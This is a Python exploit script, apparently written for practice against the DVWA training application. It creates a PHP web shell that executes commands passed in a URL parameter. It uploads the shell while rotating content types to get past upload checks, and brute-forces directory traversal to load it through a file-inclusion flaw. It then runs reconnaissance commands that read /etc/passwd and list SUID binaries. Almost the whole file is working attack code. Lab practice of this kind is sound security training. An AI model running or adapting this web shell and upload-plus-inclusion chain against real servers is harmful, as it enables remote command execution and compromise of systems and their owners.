#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import urllib.parse

# Configuration for DVWA
BASE_URL = "http://localhost/DVWA/"
UPLOAD_URL = f"{BASE_URL}vulnerabilities/upload/"
UPLOAD_DIR = f"{BASE_URL}hackable/uploads/"
# Use the proper file inclusion URL
LFI_VULN_URL = f"{BASE_URL}vulnerabilities/fi/?page="
COOKIE = {"PHPSESSID": "h52lq6jn4p4qm37pcrm815kjh0", "security": "medium"}
PAYLOAD_FILENAME = "malicious.php"
REPORT_FILENAME = "vuln_report.txt"


def create_payload():
    payload_content = """<?php
    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
    
    if(isset($_GET['cmd'])) {
        $commands = explode(';', $_GET['cmd']);
        foreach($commands as $command) {
            $clean_cmd = htmlspecialchars(trim($command));
            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
            echo "<pre>" . shell_exec($command) . "</pre>";
        }
    } else {
        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
    }
    ?>"""
    with open(PAYLOAD_FILENAME, "w") as f:
        f.write(payload_content)
    print(f"[+] Payload file '{PAYLOAD_FILENAME}' created.")


def upload_file():
    with open("content_type.txt", "r") as f:
        file_data = f.read()

    content_types = file_data.strip().split("\n")

    for type in content_types:
        data = {"Upload": "Upload", "MAX_FILE_SIZE": "100000"}
        files = {"uploaded": (PAYLOAD_FILENAME, open(PAYLOAD_FILENAME, "rb"), type)}
        try:
            print(f"[*] Uploading file with {type}")
            response = requests.post(UPLOAD_URL, files=files, data=data, cookies=COOKIE)
            if "succesfully uploaded!" in response.text:
                print("[+] File uploaded successfully!")
                return True
            else:
                print(
                    "[-] Upload failed. Check your cookies and directory permissions."
                )
        except Exception as e:
            print(f"[-] Upload error: {str(e)}")
    return False


def brute_force_lfi(lfi_url_base, payload_relative, session):
    with open("lfi_combi.txt", "r") as f:
        file_data = f.read()

    lfi_combis = file_data.strip().split("\n")

    for combi in lfi_combis:
        for depth in range(1, 10):
            traversal = combi * depth
            test_url = f"{lfi_url_base}{traversal}{payload_relative}"
            print(f"[*] Trying LFI URL: {test_url}")
            try:
                response = session.get(test_url, cookies=COOKIE)
                if "[+] Malicious file uploaded successfully!" in response.text:
                    print(f"[+] Successfully included payload: {test_url}")
                    return test_url
            except Exception as e:
                print(f"[-] Error testing {test_url}: {str(e)}")
    return None


def trigger_payload_via_lfi(url):
    """
    Appends the command parameter to the LFI URL to trigger our uploaded payload.
    """
    commands = [
        "id",
        "uname -a",
        "grep 'x:1000:' /etc/passwd",
        "ls -lAh /home",
        "find /usr/bin /bin -perm -4000 2>/dev/null",
    ]
    cmd_string = ";".join(commands)
    separator = "&" if "?" in url else "?"
    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
    try:
        print(f"[*] Triggering payload via LFI at: {full_url}")
        response = requests.get(full_url, cookies=COOKIE)
        if response.status_code == 200:
            print("[+] Command results:")
            print(response.text)
            return response.text
        else:
            print(f"[-] Execution failed (HTTP {response.status_code})")
            return ""
    except Exception as e:
        print(f"[-] Trigger error: {str(e)}")
        return ""


def generate_report(uploaded_url, lfi_url, command_results):
    report = "Vulnerability Report\n"
    report += "====================\n"
    if uploaded_url:
        report += f"\nFile Upload Vulnerability:\nDirect URL: {uploaded_url}\n"
    if lfi_url:
        report += f"\nLFI Vulnerability Exploit URL:\n{lfi_url}\n"
    if command_results:
        report += "\nCommand Execution Results:\n"
        report += command_results
    with open(REPORT_FILENAME, "w") as f:
        f.write(report)
    print(f"[+] Report generated: {REPORT_FILENAME}")


def main():
    session = requests.Session()

    # --- File Upload Phase ---
    create_payload()
    if not upload_file():
        print("[-] Aborting due to upload failure.")
        return
    # Direct URL to the uploaded file (if you can access it directly)
    direct_file_url = f"{UPLOAD_DIR}{PAYLOAD_FILENAME}"
    print(f"[+] Direct file URL (if accessible): {direct_file_url}")

    # --- LFI Brute Force Phase ---
    payload_relative = "hackable/uploads/" + PAYLOAD_FILENAME
    lfi_found_url = brute_force_lfi(LFI_VULN_URL, payload_relative, session)

    # --- Trigger Payload Phase ---
    if lfi_found_url:
        command_results = trigger_payload_via_lfi(lfi_found_url)
    else:
        print("[-] Could not locate the uploaded file via LFI.")
        command_results = ""

    # --- Report Generation ---
    generate_report(direct_file_url, lfi_found_url, command_results)


if __name__ == "__main__":
    main()
